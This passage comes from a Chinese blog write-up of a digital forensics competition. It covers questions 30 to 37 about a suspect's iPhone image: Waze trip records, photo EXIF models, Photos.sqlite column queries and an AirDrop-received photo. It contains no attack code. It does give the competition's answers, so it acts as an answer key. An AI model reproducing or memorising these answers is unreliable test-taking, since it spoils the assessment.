&lt;/h2&gt;&lt;p&gt;尝试直接打开失败，说不是pdf格式：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814124906161&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814124906161.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814124906161.png&#34; alt=&#34;image-20250814124906161&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;哎呀，这才反应过来不是PDF文件，开头特征是office应用的，但是不知道是哪一种&lt;/p&gt;
&lt;p&gt;我们拖到linux里面使用file命令测试一下（截图太长就不放了）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──(kali㉿kali)-[~]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ file 111.pdf
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;111.pdf: Composite Document File V2 Document, Little Endian, Os: MacOS, Version 6.12, Code page: 10000, Author: user30, Last Saved By: user30, Name of Creating Application: Microsoft Macintosh Excel, Create Time/Date: Wed Sep 28 12:06:13 2022, Last Saved Time/Date: Fri Sep 30 10:37:41 2022, Security: 0
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输出里面的&lt;code&gt;Composite Document File V2 Document&lt;/code&gt;表明这是 OLE 容器格式，而&lt;code&gt;Microsoft Macintosh Excel&lt;/code&gt;说明是 Excel生成的OLE文档，也就是&lt;code&gt;.xls&lt;/code&gt;文件&lt;/p&gt;
&lt;p&gt;修改后缀名打开：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814133348736&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814133348736.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814133348736.png&#34; alt=&#34;image-20250814133348736&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;林俊熙的手机好友消息里面只有一个消息与人名有关，在里面就找到了存在于表里面的人：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814133501991&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814133501991.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814133501991.png&#34; alt=&#34;image-20250814133501991&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;WONG SAI PING
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;31分析林浚熙手机上的数据他在2022年10月17日计划去什么地方&#34;&gt;31.分析林浚熙手机上的数据，他在2022年10月17日计划去什么地方?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A. 以上皆非&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. 荃湾站&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C. 沙田站&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D. 国际金融中心二期&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在手机上发现了waze软件， 是一款非GPS导航与实时路况应用&lt;/p&gt;
&lt;p&gt;但分析出来的内容里面没有10月17日的行程：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814134058784&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814134058784.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814134058784.png&#34; alt=&#34;image-20250814134058784&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;再去文件里面找一下waze，在ChunHei_iPhone.tar/AppDomain-com.waze.iphone/Documents路径下发现两个数据库，一个个查找，最终在user.db下找到了一个表，里面有时间和地点：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814134303108&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814134303108.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814134303108.png&#34; alt=&#34;image-20250814134303108&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;这两个地点都在选项里面，时间是时间戳类型，都转换一下：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814134353181&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814134353181.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814134353181.png&#34; alt=&#34;image-20250814134353181&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814134317122&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814134317122.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814134317122.png&#34; alt=&#34;image-20250814134317122&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;第二个是17号的数据&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;C
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;32承上题上述行程的结束时间是如答案为-10159需回答160159&#34;&gt;32.承上题，上述行程的结束时间是?(如答案为 1:01:59，需回答160159)
&lt;/h2&gt;&lt;p&gt;同上题图：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814134627149&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814134627149.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814134627149.png&#34; alt=&#34;image-20250814134627149&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;124500
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;题目给的例子有问题吧&lt;/p&gt;
&lt;h2 id=&#34;33于林浚熙的手机里在2022年9月1日或以后哪一张照片是由其他手机拍摄的而它的档案名是什么不要输入以大写英文及阿拉伯数字回答如-cat10jpg需回答cat10jpg&#34;&gt;33.于林浚熙的手机里，在2022年9月1日或以后，哪一张照片是由其他手机拍摄的，而它的档案名是什么?(不要输入，以大写英文及阿拉伯数字回答。如 Cat10.jpg，需回答CAT10JPG)
&lt;/h2&gt;&lt;p&gt;使用耗时任务的图片exif分析，分析完之后点左上角切换成行视图，再点击右边的设置列，把型号勾选上：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814144026870&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814144026870.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814144026870.png&#34; alt=&#34;image-20250814144026870&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;过滤拍摄时间是2022-9-1之后的图片，发现有四张（实际三张）不是林俊熙的手机iphone XR，而是XS：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814143917249&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814143917249.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814143917249.png&#34; alt=&#34;image-20250814143917249&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;然后做到这里就卡住了，题目说只有一张，但不知道怎么分辨&lt;/p&gt;
&lt;h2 id=&#34;34根据照片的数据库photossqlite-资料哪一个栏目标题column-header-可以显示这张照片的接收方式&#34;&gt;34.根据照片的数据库（Photos.sqlite) 资料，哪一个栏目标题(Column Header) 可以显示这张照片的接收方式?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A. ZIMPORTEDFROMSOURCEIDENTIFIER&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. ZIMPORTEDBYBUNDLEIDENTIFIER&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C. ZRECEIVEMETHODIDENTIFIER&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D. ZRECEIVEDFROMIDENTIFIER&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;搜索这个数据库：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814144334530&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814144334530.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814144334530.png&#34; alt=&#34;image-20250814144334530&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;连接后查询四个选项哪一个在表里面，sqlite的机制和常见的mysql不一样，交给ai就好：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;ZIMPORTEDFROMSOURCEIDENTIFIER&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AS&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;column_name&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AS&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;table_name&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;sqlite_master&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;table&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;sql&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;LIKE&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;%ZIMPORTEDFROMSOURCEIDENTIFIER%&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;UNION&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ALL&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;ZIMPORTEDBYBUNDLEIDENTIFIER&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;name&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;sqlite_master&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;table&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;sql&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;LIKE&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;%ZIMPORTEDBYBUNDLEIDENTIFIER%&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;UNION&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ALL&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;ZRECEIVEMETHODIDENTIFIER&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;name&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;sqlite_master&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;table&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;sql&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;LIKE&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;%ZRECEIVEMETHODIDENTIFIER%&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;UNION&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ALL&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;ZRECEIVEDFROMIDENTIFIER&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;name&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;sqlite_master&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;table&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;sql&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;LIKE&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;%ZRECEIVEDFROMIDENTIFIER%&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814145144022&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814145144022.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814145144022.png&#34; alt=&#34;image-20250814145144022&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;B&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;35承上题这张照片通过什么方式接收&#34;&gt;35.承上题，这张照片通过什么方式接收?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A. 网页下载&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. 蓝牙传送&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C. 以上皆非&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D. WhatsApp软件传送&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;E. Signal软件传送&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;上一题我们找到了含有接受方式字段的表格，一共有三张，经过查看发现ZADDITIONALASSETATTRIBUTES才是我们想要找的存储了所有图片的表格，利用sql查询33题找到的四张图片就行了吧：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;ZORIGINALFILENAME&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;ZIMPORTEDBYBUNDLEIDENTIFIER&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;ZADDITIONALASSETATTRIBUTES&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;ZORIGINALFILENAME&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;IN&lt;/span&gt; (
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;IMG_0420.HEIC&amp;#39;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;IMG_0421.HEIC&amp;#39;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;IMG_0422.HEIC&amp;#39;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;IMG_0446.HEIC&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814172545644&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814172545644.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814172545644.png&#34; alt=&#34;image-20250814172545644&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;什么？竟然一张都没有找到！难道这几张图片根本就不存在？？？！！！&lt;/p&gt;
&lt;p&gt;再次返回表格，确实没有看见这几张图片，不过比对他们的时间却发现了猫腻：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814172944623&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814172944623.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814172944623.png&#34; alt=&#34;image-20250814172944623&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814173022613&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814173022613.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814173022613.png&#34; alt=&#34;image-20250814173022613&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;在数据库里面，这几张来自其他手机的、以.HEIC作为后缀的图片，似乎被重新命名了，有了另一个名称&lt;/p&gt;
&lt;p&gt;而且，这时也发现前文的IMG_0420.HEIC和IMG_0423.HEIC是同一张图片，不知道为什么存储了两次&lt;/p&gt;
&lt;p&gt;不过这些都不重要，知道了真正的名称，我们改动一下接着查询：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;ZORIGINALFILENAME&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;ZIMPORTEDBYBUNDLEIDENTIFIER&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;ZADDITIONALASSETATTRIBUTES&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;ZORIGINALFILENAME&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;IN&lt;/span&gt; (
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;IMG_0381.HEIC&amp;#39;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;IMG_0383.HEIC&amp;#39;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;IMG_0730.HEIC&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814173803319&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814173803319.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814173803319.png&#34; alt=&#34;image-20250814173803319&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;四张图片的来源都是com.apple.sharingd，然后告诉ai大人吧：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814174129947&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814174129947.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814174129947.png&#34; alt=&#34;image-20250814174129947&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;原来是airdrop，这玩意可比选项里面的快多了&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;C&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;36承上题这张照片原本的档案名original-filename-是什么不要输入以大写英文及阿拉伯数字回答如-cat10jpg需回答cat10jpg&#34;&gt;36.承上题，这张照片原本的档案名(Original Filename) 是什么?不要输入，以大写英文及阿拉伯数字回答。如 Cat10,jpg，需回答CAT10JPG)
&lt;/h2&gt;&lt;p&gt;看来上一题得到的名称还是很重要的&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;IMG0730HEIC&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;37林浚熙手机里有一个备忘录notes被上了锁这个备忘录的名称是什么以大写英文及阿拉数字回答&#34;&gt;37.林浚熙手机里有一个备忘录(Notes)被上了锁，这个备忘录的名称是什么?(以大写英文及阿拉数字回答)
&lt;/h2&gt;&lt;p&gt;note里面一共四个备忘录数据，其中&amp;quot;halo&amp;quot;和&amp;quot;今天&amp;quot;两条数据是看不见的，不确定是哪个&lt;/p&gt;
